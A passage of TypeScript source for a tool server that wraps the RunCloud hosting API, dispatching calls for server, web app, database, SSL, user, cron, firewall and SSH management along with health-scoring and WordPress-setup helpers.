      case "delete_server":
        result = await runcloudRequest("DELETE", `/servers/${a.serverId}`);
        break;
      case "get_server_stats":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/stats`);
        break;
      case "get_server_hardware_info":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/hardwareinfo`);
        break;
      case "get_server_health":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/health/latest`);
        break;
      case "clean_server_disk":
        result = await runcloudRequest("PATCH", `/servers/${a.serverId}/health/diskcleaner`);
        break;
      case "get_installation_script":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/installationscript`);
        break;
      case "get_server_logs": {
        const p = new URLSearchParams();
        if (a.search) p.set("search", String(a.search));
        if (a.page) p.set("page", String(a.page));
        result = await runcloudRequest("GET", `/servers/${a.serverId}/logs?${p}`);
        break;
      }
      case "get_ssh_settings":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/settings/ssh`);
        break;
      case "update_ssh_settings":
        result = await runcloudRequest("PATCH", `/servers/${a.serverId}/settings/ssh`, {
          passwordlessLogin: a.passwordlessLogin,
          useDns: a.useDns,
          preventRootLogin: a.preventRootLogin,
        });
        break;
      case "update_server_meta": {
        const body: Record<string, unknown> = { name: a.name };
        if (a.provider) body.provider = a.provider;
        result = await runcloudRequest("PATCH", `/servers/${a.serverId}/settings/meta`, body);
        break;
      }
      case "update_server_autoupdate":
        result = await runcloudRequest("PATCH", `/servers/${a.serverId}/settings/autoupdate`, {
          softwareUpdate: a.softwareUpdate,
          securityUpdate: a.securityUpdate,
        });
        break;
      case "list_php_versions":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/php/version`);
        break;
      case "change_php_cli":
        result = await runcloudRequest("PATCH", `/servers/${a.serverId}/php/cli`, {
          phpVersion: a.phpVersion,
        });
        break;

      // ── SERVICES ────────────────────────────────────────────────────────
      case "list_services":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/services`);
        break;
      case "control_service":
        result = await runcloudRequest("PATCH", `/servers/${a.serverId}/services`, {
          action: a.action,
          realName: a.realName,
        });
        break;

      // ── WEB APPLICATIONS ────────────────────────────────────────────────
      case "list_webapps": {
        if (a.all) {
          const path = `/servers/${a.serverId}/webapps` + (a.search ? `?search=${encodeURIComponent(a.search as string)}` : "");
          result = await paginateAll(path);
        } else {
          const p = new URLSearchParams();
          if (a.search) p.set("search", String(a.search));
          if (a.page) p.set("page", String(a.page));
          result = await runcloudRequest("GET", `/servers/${a.serverId}/webapps?${p}`);
        }
        break;
      }
      case "get_webapp":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/webapps/${a.webAppId}`);
        break;
      case "create_webapp": {
        const body: Record<string, unknown> = {
          name: a.name, domainName: a.domainName, user: a.user, phpVersion: a.phpVersion,
          stack: a.stack, stackMode: a.stackMode, clickjackingProtection: a.clickjackingProtection,
          xssProtection: a.xssProtection, mimeSniffingProtection: a.mimeSniffingProtection,
          processManager: a.processManager, processManagerMaxChildren: a.processManagerMaxChildren,
          processManagerMaxRequests: a.processManagerMaxRequests, timezone: a.timezone,
          maxExecutionTime: a.maxExecutionTime, maxInputTime: a.maxInputTime,
          maxInputVars: a.maxInputVars, memoryLimit: a.memoryLimit, postMaxSize: a.postMaxSize,
          uploadMaxFilesize: a.uploadMaxFilesize, sessionGcMaxlifetime: a.sessionGcMaxlifetime,
          allowUrlFopen: a.allowUrlFopen,
        };
        if (a.publicPath) body.publicPath = a.publicPath;
        if (a.processManagerStartServers) body.processManagerStartServers = a.processManagerStartServers;
        if (a.processManagerMinSpareServers) body.processManagerMinSpareServers = a.processManagerMinSpareServers;
        if (a.processManagerMaxSpareServers) body.processManagerMaxSpareServers = a.processManagerMaxSpareServers;
        if (a.disableFunctions) body.disableFunctions = a.disableFunctions;
        if (a.openBasedir) body.openBasedir = a.openBasedir;
        result = await runcloudRequest("POST", `/servers/${a.serverId}/webapps/custom`, body);
        break;
      }
      case "delete_webapp":
        result = await runcloudRequest("DELETE", `/servers/${a.serverId}/webapps/${a.webAppId}`);
        break;
      case "rebuild_webapp":
        result = await runcloudRequest("PATCH", `/servers/${a.serverId}/webapps/${a.webAppId}/rebuild`);
        break;
      case "set_webapp_default":
        result = await runcloudRequest("POST", `/servers/${a.serverId}/webapps/${a.webAppId}/default`);
        break;
      case "remove_webapp_default":
        result = await runcloudRequest("DELETE", `/servers/${a.serverId}/webapps/${a.webAppId}/default`);
        break;
      case "create_webapp_alias":
        result = await runcloudRequest("POST", `/servers/${a.serverId}/webapps/${a.webAppId}/alias`);
        break;
      case "get_webapp_settings":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/webapps/${a.webAppId}/settings`);
        break;
      case "change_webapp_php_version":
        result = await runcloudRequest("PATCH", `/servers/${a.serverId}/webapps/${a.webAppId}/settings/php`, {
          phpVersion: a.phpVersion,
        });
        break;
      case "update_webapp_fpm_settings": {
        const fields = [
          "clickjackingProtection","xssProtection","mimeSniffingProtection",
          "processManager","processManagerStartServers","processManagerMinSpareServers",
          "processManagerMaxSpareServers","processManagerMaxChildren","processManagerMaxRequests",
          "openBasedir","timezone","disableFunctions","maxExecutionTime","maxInputTime",
          "maxInputVars","memoryLimit","postMaxSize","uploadMaxFilesize","sessionGcMaxlifetime","allowUrlFopen",
        ];
        const body: Record<string, unknown> = {};
        for (const f of fields) if (a[f] !== undefined) body[f] = a[f];
        result = await runcloudRequest("PATCH", `/servers/${a.serverId}/webapps/${a.webAppId}/settings/fpmnginx`, body);
        break;
      }
      case "get_webapp_logs": {
        const p = new URLSearchParams();
        if (a.search) p.set("search", String(a.search));
        if (a.page) p.set("page", String(a.page));
        result = await runcloudRequest("GET", `/servers/${a.serverId}/webapps/${a.webAppId}/log?${p}`);
        break;
      }

      // ── PHP INSTALLER ───────────────────────────────────────────────────
      case "install_php_script":
        result = await runcloudRequest("POST", `/servers/${a.serverId}/webapps/${a.webAppId}/installer`, {
          name: a.name,
        });
        break;
      case "get_php_installer":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/webapps/${a.webAppId}/installer`);
        break;
      case "remove_php_installer":
        result = await runcloudRequest("DELETE", `/servers/${a.serverId}/webapps/${a.webAppId}/installer/${a.installerId}`);
        break;

      // ── GIT ─────────────────────────────────────────────────────────────
      case "clone_git_repo": {
        const body: Record<string, unknown> = {
          provider: a.provider, repository: a.repository, branch: a.branch,
        };
        if (a.gitUser) body.gitUser = a.gitUser;
        if (a.gitHost) body.gitHost = a.gitHost;
        result = await runcloudRequest("POST", `/servers/${a.serverId}/webapps/${a.webAppId}/git`, body);
        break;
      }
      case "get_git_info":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/webapps/${a.webAppId}/git`);
        break;
      case "change_git_branch":
        result = await runcloudRequest("PATCH", `/servers/${a.serverId}/webapps/${a.webAppId}/git/${a.gitId}/branch`, {
          branch: a.branch,
        });
        break;
      case "update_git_deploy_script": {
        const body: Record<string, unknown> = { autoDeploy: a.autoDeploy };
        if (a.deployScript) body.deployScript = a.deployScript;
        result = await runcloudRequest("PATCH", `/servers/${a.serverId}/webapps/${a.webAppId}/git/${a.gitId}/script`, body);
        break;
      }
      case "force_git_deploy":
        result = await runcloudRequest("PUT", `/servers/${a.serverId}/webapps/${a.webAppId}/git/${a.gitId}/script`);
        break;
      case "remove_git_repo":
        result = await runcloudRequest("DELETE", `/servers/${a.serverId}/webapps/${a.webAppId}/git/${a.gitId}`);
        break;

      // ── DOMAINS ─────────────────────────────────────────────────────────
      case "list_domains": {
        const p = new URLSearchParams();
        if (a.page) p.set("page", String(a.page));
        result = await runcloudRequest("GET", `/servers/${a.serverId}/webapps/${a.webAppId}/domains?${p}`);
        break;
      }
      case "add_domain": {
        const body: Record<string, unknown> = { name: a.name };
        if (a.www !== undefined) body.www = a.www;
        if (a.redirection) body.redirection = a.redirection;
        if (a.type) body.type = a.type;
        result = await runcloudRequest("POST", `/servers/${a.serverId}/webapps/${a.webAppId}/domains`, body);
        break;
      }
      case "delete_domain":
        result = await runcloudRequest("DELETE", `/servers/${a.serverId}/webapps/${a.webAppId}/domains/${a.domainId}`);
        break;

      // ── SSL ─────────────────────────────────────────────────────────────
      case "get_ssl":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/webapps/${a.webAppId}/ssl`);
        break;
      case "install_ssl": {
        const body: Record<string, unknown> = {
          provider: a.provider, enableHttp: a.enableHttp, enableHsts: a.enableHsts,
        };
        if (a.authorizationMethod) body.authorizationMethod = a.authorizationMethod;
        if (a.environment) body.environment = a.environment;
        if (a.externalApi) body.externalApi = a.externalApi;
        if (a.privateKey) body.privateKey = a.privateKey;
        if (a.certificate) body.certificate = a.certificate;
        if (a.csrKeyType) body.csrKeyType = a.csrKeyType;
        if (a.ssl_protocol_id) body.ssl_protocol_id = a.ssl_protocol_id;
        result = await runcloudRequest("POST", `/servers/${a.serverId}/webapps/${a.webAppId}/ssl`, body);
        break;
      }
      case "redeploy_ssl":
        result = await runcloudRequest("PUT", `/servers/${a.serverId}/webapps/${a.webAppId}/ssl/${a.sslId}`);
        break;
      case "delete_ssl":
        result = await runcloudRequest("DELETE", `/servers/${a.serverId}/webapps/${a.webAppId}/ssl/${a.sslId}`);
        break;
      case "get_advanced_ssl":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/webapps/${a.webAppId}/ssl/advanced`);
        break;
      case "switch_advanced_ssl": {
        const body: Record<string, unknown> = { advancedSSL: a.advancedSSL };
        if (a.autoSSL !== undefined) body.autoSSL = a.autoSSL;
        result = await runcloudRequest("POST", `/servers/${a.serverId}/webapps/${a.webAppId}/ssl/advanced`, body);
        break;
      }
      case "install_domain_ssl": {
        const body: Record<string, unknown> = {
          provider: a.provider, enableHttp: a.enableHttp, enableHsts: a.enableHsts,
        };
        if (a.authorizationMethod) body.authorizationMethod = a.authorizationMethod;
        if (a.environment) body.environment = a.environment;
        if (a.externalApi) body.externalApi = a.externalApi;
        if (a.privateKey) body.privateKey = a.privateKey;
        if (a.certificate) body.certificate = a.certificate;
        result = await runcloudRequest("POST", `/servers/${a.serverId}/webapps/${a.webAppId}/domains/${a.domainId}/ssl`, body);
        break;
      }
      case "get_domain_ssl":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/webapps/${a.webAppId}/domains/${a.domainId}/ssl`);
        break;
      case "redeploy_domain_ssl":
        result = await runcloudRequest("PUT", `/servers/${a.serverId}/webapps/${a.webAppId}/domains/${a.domainId}/ssl/${a.sslId}`);
        break;
      case "delete_domain_ssl":
        result = await runcloudRequest("DELETE", `/servers/${a.serverId}/webapps/${a.webAppId}/domains/${a.domainId}/ssl/${a.sslId}`);
        break;

      // ── DATABASES ───────────────────────────────────────────────────────
      case "list_databases": {
        if (a.all) {
          result = await paginateAll(`/servers/${a.serverId}/databases`);
        } else {
          const p = new URLSearchParams();
          if (a.search) p.set("search", String(a.search));
          if (a.page) p.set("page", String(a.page));
          result = await runcloudRequest("GET", `/servers/${a.serverId}/databases?${p}`);
        }
        break;
      }
      case "get_database":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/databases/${a.databaseId}`);
        break;
      case "create_database": {
        const body: Record<string, unknown> = { name: a.name };
        if (a.collation) body.collation = a.collation;
        result = await runcloudRequest("POST", `/servers/${a.serverId}/databases`, body);
        break;
      }
      case "delete_database": {
        const body: Record<string, unknown> = {};
        if (a.deleteUser !== undefined) body.deleteUser = a.deleteUser;
        result = await runcloudRequest("DELETE", `/servers/${a.serverId}/databases/${a.databaseId}`, body);
        break;
      }
      case "list_database_users": {
        const p = new URLSearchParams();
        if (a.search) p.set("search", String(a.search));
        if (a.page) p.set("page", String(a.page));
        result = await runcloudRequest("GET", `/servers/${a.serverId}/databaseusers?${p}`);
        break;
      }
      case "get_database_user":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/databaseusers/${a.databaseUserId}`);
        break;
      case "create_database_user":
        result = await runcloudRequest("POST", `/servers/${a.serverId}/databaseusers`, {
          username: a.username, password: a.password,
        });
        break;
      case "update_database_user_password":
        result = await runcloudRequest("PATCH", `/servers/${a.serverId}/databaseusers/${a.databaseUserId}`, {
          password: a.password,
        });
        break;
      case "delete_database_user":
        result = await runcloudRequest("DELETE", `/servers/${a.serverId}/databaseusers/${a.databaseUserId}`);
        break;
      case "grant_database_user":
        result = await runcloudRequest("POST", `/servers/${a.serverId}/databases/${a.databaseId}/grant`, {
          id: a.databaseUserId,
        });
        break;
      case "list_granted_database_users": {
        const p = new URLSearchParams();
        if (a.search) p.set("search", String(a.search));
        result = await runcloudRequest("GET", `/servers/${a.serverId}/databases/${a.databaseId}/grant?${p}`);
        break;
      }
      case "revoke_database_user":
        result = await runcloudRequest("DELETE", `/servers/${a.serverId}/databases/${a.databaseId}/grant`, {
          id: a.databaseUserId,
        });
        break;

      // ── SYSTEM USERS ────────────────────────────────────────────────────
      case "list_system_users": {
        const p = new URLSearchParams();
        if (a.search) p.set("search", String(a.search));
        if (a.page) p.set("page", String(a.page));
        result = await runcloudRequest("GET", `/servers/${a.serverId}/users?${p}`);
        break;
      }
      case "get_system_user":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/users/${a.userId}`);
        break;
      case "create_system_user": {
        const body: Record<string, unknown> = { username: a.username };
        if (a.password) body.password = a.password;
        result = await runcloudRequest("POST", `/servers/${a.serverId}/users`, body);
        break;
      }
      case "change_system_user_password":
        result = await runcloudRequest("PATCH", `/servers/${a.serverId}/users/${a.userId}/password`, {
          password: a.password,
        });
        break;
      case "generate_deployment_key":
        result = await runcloudRequest("PATCH", `/servers/${a.serverId}/users/${a.userId}/deploymentkey`);
        break;
      case "delete_system_user":
        result = await runcloudRequest("DELETE", `/servers/${a.serverId}/users/${a.userId}`);
        break;

      // ── SSH KEYS ────────────────────────────────────────────────────────
      case "list_ssh_keys": {
        const p = new URLSearchParams();
        if (a.label) p.set("label", String(a.label));
        if (a.page) p.set("page", String(a.page));
        result = await runcloudRequest("GET", `/servers/${a.serverId}/sshcredentials?${p}`);
        break;
      }
      case "get_ssh_key":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/sshcredentials/${a.credentialId}`);
        break;
      case "add_ssh_key":
        result = await runcloudRequest("POST", `/servers/${a.serverId}/sshcredentials`, {
          label: a.label, username: a.username, publicKey: a.publicKey,
        });
        break;
      case "delete_ssh_key":
        result = await runcloudRequest("DELETE", `/servers/${a.serverId}/sshcredentials/${a.credentialId}`);
        break;

      // ── CRON JOBS ───────────────────────────────────────────────────────
      case "list_cronjobs": {
        const p = new URLSearchParams();
        if (a.search) p.set("search", String(a.search));
        if (a.page) p.set("page", String(a.page));
        result = await runcloudRequest("GET", `/servers/${a.serverId}/cronjobs?${p}`);
        break;
      }
      case "get_cronjob":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/cronjobs/${a.jobId}`);
        break;
      case "create_cronjob":
        result = await runcloudRequest("POST", `/servers/${a.serverId}/cronjobs`, {
          label: a.label, username: a.username, command: a.command,
          minute: a.minute, hour: a.hour, dayOfMonth: a.dayOfMonth,
          month: a.month, dayOfWeek: a.dayOfWeek,
        });
        break;
      case "delete_cronjob":
        result = await runcloudRequest("DELETE", `/servers/${a.serverId}/cronjobs/${a.jobId}`);
        break;
      case "rebuild_cronjobs":
        result = await runcloudRequest("POST", `/servers/${a.serverId}/cronjobs/rebuild`);
        break;

      // ── SUPERVISOR ──────────────────────────────────────────────────────
      case "list_supervisor_jobs": {
        const p = new URLSearchParams();
        if (a.search) p.set("search", String(a.search));
        if (a.page) p.set("page", String(a.page));
        result = await runcloudRequest("GET", `/servers/${a.serverId}/supervisors?${p}`);
        break;
      }
      case "get_supervisor_job":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/supervisors/${a.supervisorId}`);
        break;
      case "get_supervisor_status":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/supervisors/status`);
        break;
      case "list_supervisor_binaries":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/supervisors/binaries`);
        break;
      case "create_supervisor_job": {
        const body: Record<string, unknown> = {
          label: a.label, username: a.username, command: a.command, numprocs: a.numprocs,
        };
        if (a.autoRestart !== undefined) body.autoRestart = a.autoRestart;
        if (a.autoStart !== undefined) body.autoStart = a.autoStart;
        if (a.binary) body.binary = a.binary;
        if (a.directory) body.directory = a.directory;
        result = await runcloudRequest("POST", `/servers/${a.serverId}/supervisors`, body);
        break;
      }
      case "reload_supervisor_job":
        result = await runcloudRequest("PATCH", `/servers/${a.serverId}/supervisors/${a.supervisorId}/reload`);
        break;
      case "rebuild_supervisor_jobs":
        result = await runcloudRequest("POST", `/servers/${a.serverId}/supervisors/rebuild`);
        break;
      case "delete_supervisor_job":
        result = await runcloudRequest("DELETE", `/servers/${a.serverId}/supervisors/${a.supervisorId}`);
        break;

      // ── FIREWALL ────────────────────────────────────────────────────────
      case "list_firewall_rules": {
        const p = new URLSearchParams();
        if (a.page) p.set("page", String(a.page));
        result = await runcloudRequest("GET", `/servers/${a.serverId}/security/firewalls?${p}`);
        break;
      }
      case "create_firewall_rule": {
        const body: Record<string, unknown> = {
          type: a.type, port: a.port, protocol: a.protocol,
        };
        if (a.ipAddress) body.ipAddress = a.ipAddress;
        if (a.firewallAction) body.firewallAction = a.firewallAction;
        result = await runcloudRequest("POST", `/servers/${a.serverId}/security/firewalls`, body);
        break;
      }
      case "deploy_firewall_rules":
        result = await runcloudRequest("PUT", `/servers/${a.serverId}/security/firewalls`);
        break;
      case "delete_firewall_rule":
        result = await runcloudRequest("DELETE", `/servers/${a.serverId}/security/firewalls/${a.firewallId}`);
        break;
      case "list_fail2ban_blocked_ips":
        result = await runcloudRequest("GET", `/servers/${a.serverId}/security/fail2ban/blockedip`);
        break;
      case "unblock_fail2ban_ip":
        result = await runcloudRequest("DELETE", `/servers/${a.serverId}/security/fail2ban/blockedip`, {
          ip: a.ip,
        });
        break;

      // ── EXTERNAL APIs ───────────────────────────────────────────────────
      case "list_external_apis": {
        const p = new URLSearchParams();
        if (a.search) p.set("search", String(a.search));
        if (a.page) p.set("page", String(a.page));
        result = await runcloudRequest("GET", `/settings/externalapi?${p}`);
        break;
      }
      case "get_external_api":
        result = await runcloudRequest("GET", `/settings/externalapi/${a.apiId}`);
        break;
      case "create_external_api": {
        const body: Record<string, unknown> = {
          label: a.label, service: a.service, secret: a.secret,
        };
        if (a.username) body.username = a.username;
        result = await runcloudRequest("POST", "/settings/externalapi", body);
        break;
      }
      case "update_external_api":
        result = await runcloudRequest("PATCH", `/settings/externalapi/${a.apiId}`, {
          label: a.label, username: a.username, secret: a.secret,
        });
        break;
      case "delete_external_api":
        result = await runcloudRequest("DELETE", `/settings/externalapi/${a.apiId}`);
        break;

      // ── STATIC DATA ─────────────────────────────────────────────────────
      case "list_timezones":
        result = await runcloudRequest("GET", "/static/timezones");
        break;
      case "list_database_collations":
        result = await runcloudRequest("GET", "/static/databases/collations");
        break;
      case "list_script_installers":
        result = await runcloudRequest("GET", "/static/webapps/installers");
        break;
      case "list_ssl_protocols":
        result = await runcloudRequest("POST", "/static/ssl/protocols", {
          webServer: (a.webServer as string) ?? "nginx",
        });
        break;

      // ── SSH EXECUTION ───────────────────────────────────────────────────
      case "ssh_run_command": {
        const ip = await getServerIP(a.serverId as number);
        const timeout = validateNumeric(a.timeoutSeconds ?? 30, "timeoutSeconds", 1, 300) * 1000;
        const out = await sshExec(ip, a.username as string, a.password as string, a.command as string, timeout);
        result = {
          host: ip,
          command: a.command,
          stdout: out.stdout,
          stderr: out.stderr,
          exitCode: out.code,
        };
        break;
      }
      case "ssh_wp_cli": {
        const ip = await getServerIP(a.serverId as number);
        const cmd = `cd ${shellEscape(validatePath(a.appPath as string))} && wp ${shellEscape(a.wpcliCommand as string)} --allow-root 2>&1`;
        const out = await sshExec(ip, a.username as string, a.password as string, cmd, 60000);
        result = {
          host: ip,
          wpcliCommand: `wp ${a.wpcliCommand}`,
          stdout: out.stdout,
          stderr: out.stderr,
          exitCode: out.code,
        };
        break;
      }
      case "ssh_artisan": {
        const ip = await getServerIP(a.serverId as number);
        const cmd = `cd ${shellEscape(validatePath(a.appPath as string))} && php artisan ${shellEscape(a.artisanCommand as string)} 2>&1`;
        const out = await sshExec(ip, a.username as string, a.password as string, cmd, 60000);
        result = {
          host: ip,
          artisanCommand: `php artisan ${a.artisanCommand}`,
          stdout: out.stdout,
          stderr: out.stderr,
          exitCode: out.code,
        };
        break;
      }
      case "ssh_tail_log": {
        const ip = await getServerIP(a.serverId as number);
        const lines = validateNumeric(a.lines ?? 100, "lines", 1, 10000);
        const cmd = `tail -n ${lines} ${shellEscape(validatePath(a.logPath as string))} 2>&1`;
        const out = await sshExec(ip, a.username as string, a.password as string, cmd, 15000);
        result = {
          host: ip,
          logPath: a.logPath,
          lines,
          output: out.stdout || out.stderr,
          exitCode: out.code,
        };
        break;
      }

      // ── COMPOUND TOOLS ──────────────────────────────────────────────────
      case "server_overview": {
        const sid = a.serverId as number;
        const [info, health, hardware, services, webapps] = await Promise.allSettled([
          runcloudRequest("GET", `/servers/${sid}`),
          runcloudRequest("GET", `/servers/${sid}/health/latest`),
          runcloudRequest("GET", `/servers/${sid}/hardwareinfo`),
          runcloudRequest("GET", `/servers/${sid}/services`),
          runcloudRequest("GET", `/servers/${sid}/webapps?perPage=40`),
        ]);
        result = {
          info:     info.status     === "fulfilled" ? info.value     : { error: info.reason?.message },
          health:   health.status   === "fulfilled" ? health.value   : { error: health.reason?.message },
          hardware: hardware.status === "fulfilled" ? hardware.value : { error: hardware.reason?.message },
          services: services.status === "fulfilled" ? services.value : { error: services.reason?.message },
          webapps:  webapps.status  === "fulfilled" ? webapps.value  : { error: webapps.reason?.message },
        };
        break;
      }
      case "webapp_full_info": {
        const sid = a.serverId as number;
        const wid = a.webAppId as number;
        const [webapp, settings, domains, ssl, git] = await Promise.allSettled([
          runcloudRequest("GET", `/servers/${sid}/webapps/${wid}`),
          runcloudRequest("GET", `/servers/${sid}/webapps/${wid}/settings`),
          runcloudRequest("GET", `/servers/${sid}/webapps/${wid}/domains`),
          runcloudRequest("GET", `/servers/${sid}/webapps/${wid}/ssl`),
          runcloudRequest("GET", `/servers/${sid}/webapps/${wid}/git`),
        ]);
        result = {
          webapp:   webapp.status   === "fulfilled" ? webapp.value   : { error: webapp.reason?.message },
          settings: settings.status === "fulfilled" ? settings.value : { error: settings.reason?.message },
          domains:  domains.status  === "fulfilled" ? domains.value  : { error: domains.reason?.message },
          ssl:      ssl.status      === "fulfilled" ? ssl.value      : { error: ssl.reason?.message },
          git:      git.status      === "fulfilled" ? git.value      : { error: git.reason?.message },
        };
        break;
      }
      case "all_servers_health": {
        const serversRes = await runcloudRequest("GET", "/servers?perPage=40") as Record<string, unknown>;
        const servers = (serversRes.data ?? []) as Record<string, unknown>[];
        const healthChecks = await Promise.allSettled(
          servers.map((s) => runcloudRequest("GET", `/servers/${s.id}/health/latest`))
        );
        result = servers.map((s, i) => ({
          id: s.id,
          name: s.name,
          ipAddress: s.ipAddress,
          connected: s.connected,
          online: s.online,
          health: healthChecks[i].status === "fulfilled"
            ? healthChecks[i].value
            : { error: (healthChecks[i] as PromiseRejectedResult).reason?.message },
        }));
        break;
      }
      case "ssl_expiry_check": {
        const sid = a.serverId as number;
        const webapps = await paginateAll(`/servers/${sid}/webapps`) as Record<string, unknown>[];
        const sslChecks = await Promise.allSettled(
          webapps.map((w) => runcloudRequest("GET", `/servers/${sid}/webapps/${w.id}/ssl`))
        );
        const now = Date.now();
        const thirtyDays = 30 * 24 * 60 * 60 * 1000;
        result = webapps.map((w, i) => {
          if (sslChecks[i].status === "rejected") {
            return { webApp: w.name, domain: w.name, ssl: null, status: "no_ssl" };
          }
          const ssl = (sslChecks[i] as PromiseFulfilledResult<unknown>).value as Record<string, unknown>;
          if (!ssl || !ssl.validUntil) {
            return { webApp: w.name, ssl: null, status: "no_ssl" };
          }
          const expiry = new Date(ssl.validUntil as string).getTime();
          const daysLeft = Math.round((expiry - now) / (24 * 60 * 60 * 1000));
          return {
            webApp: w.name,
            validUntil: ssl.validUntil,
            daysLeft,
            status: expiry < now ? "EXPIRED" : daysLeft <= 30 ? "EXPIRING_SOON" : "OK",
            sslId: ssl.id,
          };
        });
        break;
      }
      case "wordpress_quickstart": {
        const sid = a.serverId as number;
        const tz = (a.timezone as string) ?? "UTC";
        const log: Record<string, unknown> = {};

        // 1. Create system user
        const sysUser = await runcloudRequest("POST", `/servers/${sid}/users`, {
          username: a.sysUsername, password: a.sysPassword,
        }) as Record<string, unknown>;
        log.systemUser = { id: sysUser.id, username: sysUser.username };

        // 2. Create database
        const db = await runcloudRequest("POST", `/servers/${sid}/databases`, {
          name: a.dbName, collation: "utf8mb4_unicode_ci",
        }) as Record<string, unknown>;
        log.database = { id: db.id, name: db.name };

        // 3. Create database user
        const dbUser = await runcloudRequest("POST", `/servers/${sid}/databaseusers`, {
          username: a.dbUsername, password: a.dbPassword,
        }) as Record<string, unknown>;
        log.databaseUser = { id: dbUser.id, username: dbUser.username };

        // 4. Grant access
        await runcloudRequest("POST", `/servers/${sid}/databases/${db.id}/grant`, {
          id: dbUser.id,
        });
        log.grant = "database user granted access to database";

        // 5. Create web application
        const webapp = await runcloudRequest("POST", `/servers/${sid}/webapps/custom`, {
          name: a.appName, domainName: a.domainName, user: sysUser.id,
          phpVersion: a.phpVersion, stack: "hybrid", stackMode: "production",
          clickjackingProtection: true, xssProtection: true, mimeSniffingProtection: true,
          processManager: "ondemand", processManagerMaxChildren: 50, processManagerMaxRequests: 500,
          timezone: tz, maxExecutionTime: 300, maxInputTime: 300, maxInputVars: 3000,
          memoryLimit: 256, postMaxSize: 64, uploadMaxFilesize: 64,
          sessionGcMaxlifetime: 1440, allowUrlFopen: true,
        }) as Record<string, unknown>;
        log.webApp = { id: webapp.id, name: webapp.name, rootPath: webapp.rootPath };

        // 6. Install WordPress
        const installer = await runcloudRequest("POST", `/servers/${sid}/webapps/${webapp.id}/installer`, {
          name: "wordpress",
        }) as Record<string, unknown>;
        log.installer = { id: installer.id, name: installer.realName };

        result = {
          success: true,
          summary: log,
          nextSteps: [
            `Visit http://${a.domainName}/wp-admin/install.php to complete WordPress setup`,
            `Database: ${a.dbName} | DB User: ${a.dbUsername}`,
            `System User: ${a.sysUsername} | Root: ${(webapp.rootPath as string) ?? ""}`,
            "Install SSL: use install_ssl tool with provider=letsencrypt",
          ],
        };
        break;
      }

      // ── SEARCH ──────────────────────────────────────────────────────────
      case "find_webapp_by_domain": {
        const domain = (a.domain as string).toLowerCase();
        const serversRes = await runcloudRequest("GET", "/servers?perPage=40") as Record<string, unknown>;
        const servers = (serversRes.data ?? []) as Record<string, unknown>[];
        const matches: unknown[] = [];
        for (const s of servers) {
          const webappsRes = await runcloudRequest("GET", `/servers/${s.id}/webapps?perPage=40`) as Record<string, unknown>;
          const webapps = (webappsRes.data ?? []) as Record<string, unknown>[];
          for (const w of webapps) {
            const name = String(w.name ?? "").toLowerCase();
            const domainName = String(w.domainName ?? "").toLowerCase();
            if (name.includes(domain) || domainName.includes(domain)) {
              matches.push({ server: { id: s.id, name: s.name, ipAddress: s.ipAddress }, webapp: w });
            }
          }
        }
        result = { query: a.domain, matches, total: matches.length };
        break;
      }
      case "webapp_inventory": {
        const serversRes = await runcloudRequest("GET", "/servers?perPage=40") as Record<string, unknown>;
        const servers = (serversRes.data ?? []) as Record<string, unknown>[];
        const inventory: unknown[] = [];
        await Promise.allSettled(servers.map(async (s) => {
          const wRes = await runcloudRequest("GET", `/servers/${s.id}/webapps?perPage=40`) as Record<string, unknown>;
          const webapps = (wRes.data ?? []) as Record<string, unknown>[];
          for (const w of webapps) {
            inventory.push({
              server: s.name,
              serverId: s.id,
              webapp: w.name,
              webAppId: w.id,
              domain: w.domainName,
              phpVersion: w.phpVersion,
              stack: w.stack,
              stackMode: w.stackMode,
            });
          }
        }));
        result = { totalServers: servers.length, totalWebapps: inventory.length, inventory };
        break;
      }

      // ── HEALTH & MONITORING ──────────────────────────────────────────────
      case "server_health_score": {
        const sid = a.serverId as number;
        const [health, hardware, services] = await Promise.allSettled([
          runcloudRequest("GET", `/servers/${sid}/health/latest`),
          runcloudRequest("GET", `/servers/${sid}/hardwareinfo`),
          runcloudRequest("GET", `/servers/${sid}/services`),
        ]);
        let score = 100;
        const warnings: string[] = [];
        const details: Record<string, unknown> = {};

        if (health.status === "fulfilled") {
          const h = health.value as Record<string, unknown>;
          const mem = Number(h.memoryUsagePercent ?? 0);
          const disk = Number(h.diskUsagePercent ?? 0);
          const load = Number(h.loadAverage ?? 0);
          details.memory = `${mem}%`;
          details.disk = `${disk}%`;
          details.loadAverage = load;
          if (mem > 90) { score -= 30; warnings.push(`Critical memory usage: ${mem}%`); }
          else if (mem > 75) { score -= 15; warnings.push(`High memory usage: ${mem}%`); }
          if (disk > 90) { score -= 30; warnings.push(`Critical disk usage: ${disk}%`); }
          else if (disk > 75) { score -= 15; warnings.push(`High disk usage: ${disk}%`); }
          if (load > 4) { score -= 20; warnings.push(`High load average: ${load}`); }
          else if (load > 2) { score -= 10; warnings.push(`Elevated load average: ${load}`); }
        }
        if (services.status === "fulfilled") {
          const svcs = (services.value as Record<string, unknown>).data as Record<string, unknown>[];
          if (Array.isArray(svcs)) {
            const stopped = svcs.filter((s) => s.status === "stopped" || s.isRunning === false);
            if (stopped.length > 0) {
              score -= stopped.length * 10;
              warnings.push(`${stopped.length} service(s) not running: ${stopped.map((s) => s.realName).join(", ")}`);
            }
          }
        }
        score = Math.max(0, score);
        const grade = score >= 90 ? "A" : score >= 75 ? "B" : score >= 60 ? "C" : score >= 40 ? "D" : "F";
        result = { score, grade, status: score >= 75 ? "healthy" : score >= 50 ? "degraded" : "critical", warnings, details };
        break;
      }
